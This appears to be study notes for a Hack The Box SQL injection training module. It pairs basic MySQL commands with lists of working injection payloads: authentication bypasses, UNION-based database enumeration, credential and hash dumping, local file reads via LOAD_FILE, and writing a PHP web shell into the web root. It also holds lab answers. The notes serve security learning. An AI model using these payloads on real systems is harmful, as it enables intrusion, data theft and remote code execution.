# SQL Injection Fundamentals  

>[Introduction](https://academy.hackthebox.com/module/33/section/177)  

## MySQL  


| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | login to mysql database [Intro to MySQL](https://academy.hackthebox.com/module/33/section/183) |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table [](https://academy.hackthebox.com/module/33/section/190) |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values. Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next. |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 [Query Results](https://academy.hackthebox.com/module/33/section/191) |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |
| `select * from departments where dept_name like 'Develop%';` | Will get the department number for the `Development` department. |
| `select * from employees where first_name like 'Bar%' and hire_date = '1990-01-01' LIMIT 2;` | Retrieve the last name of the employee whose first name starts with "Bar" AND who was hired on `1990-01-01`. |

## MySQL Operator Precedence  

>[SQL Operators](https://academy.hackthebox.com/module/33/section/192)  

* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

>Query: In the 'titles' table, what is the number of records WHERE the employee number is **greater** than `10000` **OR** their title does **NOT** contain `engineer`?  

```
select * from titles WHERE emp_no > 10000 OR title != 'engineer%';
```  

## SQL Injection  

>[Intro to SQL Injections & Types of SQL Injections](https://academy.hackthebox.com/module/33/section/193)  

### Identify SQLi  

| **Payload**   | **URL Encoded**   |
| --------------|-------------------|
| `'` | %27 |
| `"` | %22 |
| `#` | %23 |
| `;` | %3B |
| `)` | %29 |


| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass [Subverting Query Logic - Authentication Bypass](https://academy.hackthebox.com/module/33/section/194) |
| `tom' or '1'='1` | Log in as the user 'tom'. |
| `admin')-- -` | Basic Auth Bypass With comments [Using Comments](https://academy.hackthebox.com/module/33/section/799) |
| `any' OR id =5);# | Login as the user with the id 5 to get the flag. |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | PayloadsAllTheThings SQL Injection Examples |

>Connect to the MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.  

```
SELECT COUNT(*) AS total_records 
FROM
  (SELECT 'employees' AS source_table, emp_no, birth_date, first_name, last_name, gender, hire_date, NULL AS dept_no, NULL AS dept_name FROM employees
   UNION
   SELECT 'departments' AS source_table, NULL AS emp_no, NULL AS birth_date, NULL AS first_name, NULL AS last_name, NULL AS gender, NULL AS hire_date, dept_no, dept_name FROM departments) AS combined_table;
```  

![sql-Union-Clause](/images/sql-Union-Clause.png)  
   
>In this query, we added `NULL` place holders for the columns that are not present in one of the tables. This should now execute without any errors, and it will give you the total number of records returned after performing the UNION of the two tables.  


| **Payload**   | **Description**   |
| --------------|-------------------|
| **Union Injection** | [Methodology of SQL Injection with UNION, from detecting number of columns to locating of injection](https://academy.hackthebox.com/module/33/section/216) |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection. Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--). [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection, Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--). |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output [Database Enumeration](https://academy.hackthebox.com/module/33/section/217) |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |

>What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?  

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```  

>Placing the database name infront of the table name, `ilfreight.users` to extract the specific columns `username,password`.  
```
cn' UNION select 1,username,password,4 from ilfreight.users-- -
```  

![sqli-data-extract](/images/sqli-data-extract.png)  


| **Payload**   | **Description**   |
| --------------|-------------------|
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user running SQL service queries on web application. [Union Injection](https://academy.hackthebox.com/module/33/section/216) |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges [User Privileges](https://academy.hackthebox.com/module/33/section/792) |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |



| **Payload**   | **Description**   |
| --------------|-------------------|
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

>Retrieve the source code using `load_file`  

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```  

>From above source we see the `include` line state the `config.php` file is imported.

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

![SQLi-load-file](/images/SQLi-load-file.png)  
